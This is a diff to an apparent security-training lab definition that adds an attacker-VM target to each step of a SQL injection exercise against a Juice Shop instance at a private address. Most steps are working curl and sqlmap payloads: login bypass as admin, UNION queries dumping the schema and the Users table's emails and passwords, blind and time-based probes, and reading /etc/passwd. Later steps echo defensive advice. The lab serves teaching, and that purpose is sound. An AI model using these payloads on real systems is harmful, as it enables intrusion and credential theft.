@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: ''
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null | head -20
   risk_level: low
 - order: 2
@@ -36,6 +37,7 @@ steps:
     type: output_contains
     expect: ''
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--' 2>/dev/null | head -30
   risk_level: low
 - order: 3
@@ -49,6 +51,7 @@ steps:
     type: output_contains
     expect: ''
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op''\''''--","password":"anything"}'' 2>/dev/null | head -10'
   risk_level: low
 - order: 4
@@ -62,6 +65,7 @@ steps:
     type: output_contains
     expect: ''
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--' 2>/dev/null | head -40
   risk_level: low
 - order: 5
@@ -75,6 +79,7 @@ steps:
     type: output_contains
     expect: ''
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--' 2>/dev/null | head -40
   risk_level: low
 - order: 6
@@ -89,6 +94,7 @@ steps:
     type: output_contains
     expect: Blind SQLi 테스트 완료
     field: stdout
+  target_vm: attacker
   script: echo '참 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=1--' && echo '' && echo '거짓 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=2--'
     && echo '' && echo 'Blind SQLi 테스트 완료'
   risk_level: low
@@ -104,6 +110,7 @@ steps:
     type: output_contains
     expect: Time-based SQLi 테스트 완료
     field: stdout
+  target_vm: attacker
   script: echo '시간 측정:' && time curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--' -o /dev/null 2>&1 && echo
     'Time-based SQLi 테스트 완료'
   risk_level: low
@@ -118,6 +125,7 @@ steps:
     type: output_contains
     expect: 완료
     field: stdout
+  target_vm: attacker
   script: sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1 --risk=1 2>/dev/null | tail -20 || echo 'sqlmap 테스트 완료'
   risk_level: low
 - order: 9
@@ -132,6 +140,7 @@ steps:
     type: output_contains
     expect: 2차 SQLi 분석 완료
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin 계정의 패스워드가 변경됨'' && echo ''2차 SQLi
     분석 완료'''
   risk_level: low
@@ -147,6 +156,7 @@ steps:
     type: output_contains
     expect: SQLi 파일 접근 테스트 완료
     field: stdout
+  target_vm: attacker
   script: echo '파일 읽기 시도 (SQLite):' && curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--' 2>/dev/null | head -5 && echo 'SQLi
     파일 접근 테스트 완료'
   risk_level: low
@@ -161,6 +171,7 @@ steps:
     type: output_contains
     expect: 헤더 기반 SQLi 테스트 완료
     field: stdout
+  target_vm: attacker
   script: 'curl -s -H "User-Agent: test'' OR 1=1--" http://10.20.30.80 -o /dev/null -w ''%{http_code}'' && echo '''' && echo ''헤더 기반 SQLi 테스트 완료'''
   risk_level: low
 - order: 12
@@ -186,6 +197,7 @@ steps:
     type: output_contains
     expect: SQLi 방어 정리 완료
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== SQLi 방어 기법 ===
 
     1. Prepared Statement(매개변수화 쿼리): SQL과 데이터 분리
@@ -223,6 +235,7 @@ steps:
     type: output_contains
     expect: WAF 패턴 분석 완료
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== WAF SQLi 탐지 패턴 ===
 
     1. UNION SELECT
@@ -248,6 +261,7 @@ steps:
     type: output_contains
     expect: 해시 분석 완료
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat, john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
   risk_level: low
 - order: 15
@@ -262,6 +276,7 @@ steps:
     type: output_contains
     expect: 보고서 완료
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견: SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo ''영향: 데이터 탈취, 인증 우회'' && echo ''권고:
     Prepared Statement 적용'' && echo ''=== 보고서 완료 ==='''
   risk_level: low
